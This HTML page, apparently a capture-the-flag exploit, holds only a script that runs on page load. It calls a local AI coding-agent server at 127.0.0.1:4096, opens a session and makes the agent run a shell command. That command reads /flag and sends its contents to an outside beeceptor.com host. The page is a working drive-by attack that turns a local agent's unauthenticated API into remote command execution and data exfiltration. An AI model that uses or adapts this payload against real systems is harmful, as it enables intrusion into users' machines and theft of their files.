<!doctype html>
<html>
<body>
<script>
(async () => {
  const base = 'http://127.0.0.1:4096';
  const exfil = 'https://1233334.free.beeceptor.com';

  try {
    let agent = 'build';

    try {
      const ar = await fetch(base + '/agent');
      const aj = await ar.json();
      if (Array.isArray(aj) && aj.length) {
        agent = aj.find(x => x.id === 'build')?.id || aj[0].id || 'build';
      }
    } catch (_) {}

    const sr = await fetch(base + '/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}'
    });
    const session = await sr.json();

    const cmd =
      `chmod 644 /flag && ` +
      `node -e "const https=require('https'),fs=require('fs');` +
      `https.get('${exfil}?f='+encodeURIComponent(fs.readFileSync('/flag','utf8')))"`;

    await fetch(`${base}/session/${session.id}/shell`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        agent,
        command: cmd
      })
    });
  } catch (e) {}
})();
</script>
</body>
</html>
